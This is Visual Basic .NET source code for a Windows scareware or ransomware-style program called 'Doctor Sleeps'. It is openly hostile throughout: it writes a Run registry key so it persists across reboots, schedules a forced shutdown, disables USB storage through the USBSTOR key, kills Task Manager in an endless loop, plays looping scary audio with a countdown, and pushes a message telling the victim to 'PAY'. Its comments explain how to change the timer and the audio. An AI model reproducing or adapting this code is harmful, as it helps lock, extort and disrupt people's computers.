'Doctor Sleeps>>>
'Created by The Blackstar Project 2020\\\
Imports Microsoft.Win32

Public Class Form1

    Private Sub StartUp(sender As Object, e As EventArgs) Handles MyBase.Load ' Sub for Startup///
        My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
    End Sub  'This allows the program to autorun on restart

    Private Sub DoctorSleeps()
        Dim filepath As String
        Dim registrykey As Object
        filepath = Environ("homedrive") + "\programdata\DoctorSleeps.exe"
        registrykey = CreateObject("Wscript.Shell")
        registrykey.regwrite("HKCU\software\microsoft\windows\currentversion\run\DoctorSleeps", filepath)
        DoctorSleeps()
    End Sub


    Private TargetDT As DateTime
    Private CountDownFrom As TimeSpan = TimeSpan.FromMinutes(60) ' The number 60 (to the left) will alter your time on the countdown

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        My.Computer.Audio.Play(My.Resources.output, AudioPlayMode.BackgroundLoop)   ' Wav file format must be used. This will activate when the program starts and loop
        Timer1.Interval = 100                                                       ' Go to https://lingojam.com/ScaryVoiceChanger to create a voice using your voice//
        TargetDT = DateTime.Now.Add(CountDownFrom)
        Timer1.Start()
        Shell("shutdown -s -t 6000")
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
        regKey.SetValue("Start", 4)


        Dim Ans As Integer
        Ans = MsgBox("If you want to fix this, click YES and then PAY on the next window?", 1, "Sleep Manager")
        If Ans = 1 Then
            MsgBox("You made a smart decision")
        Else
            MsgBox("Enjoy your sleep")
        End If
        'shut down code///
        Dim t As New Threading.Thread(AddressOf block) 'Start of Shutdown Code>>>
        t.Start()
        For Each p As Process In Process.GetProcessesByName("taskmgr") ' Disables ability to open Task Manager///
            p.Kill()
        Next
    End Sub


    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim ts As TimeSpan = TargetDT.Subtract(DateTime.Now) 'Start of Timer1 Code>>>>
        If ts.TotalMilliseconds > 0 Then
            Label1.Text = ts.ToString("hh\:mm\:ss")
        Else
            Label1.Text = "00:00"
            Timer1.Stop() ' End of Timer1 Code>>>

        End If
    End Sub
    Private Sub Block(sender As Object, e As EventArgs) ' Continuation of Block for Task Manager and MSCONFIG///
        Dim t As New Threading.Thread(AddressOf block)
        t.Start()
    End Sub
    Sub block()
        While True
            For Each p As Process In Process.GetProcessesByName("taskmgr")
                p.Kill()
            Next

            Threading.Thread.Sleep(100)
        End While ' End of Block>>>
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Shell("shutdown -s")
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
        regKey.SetValue("Start", 4)
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        SleepCenter.Show()
        Me.Hide()
    End Sub
End Class
